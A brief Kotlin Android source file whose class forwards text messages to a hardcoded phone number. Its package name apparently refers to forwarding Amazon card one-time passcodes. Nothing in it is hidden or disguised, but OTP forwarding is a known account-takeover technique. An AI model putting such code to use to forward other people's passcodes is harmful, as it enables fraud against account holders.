package com.example.fwdamazoncardotp

import android.content.Context
import android.telephony.SmsManager

class SMSForwarder(private val context: Context) {

    private val forwardTo = "7989050647" // Replace with destination number

    fun sendSMS(message: String) {
        val smsManager = SmsManager.getDefault()
        smsManager.sendTextMessage(forwardTo, null, message, null, null)
    }
}
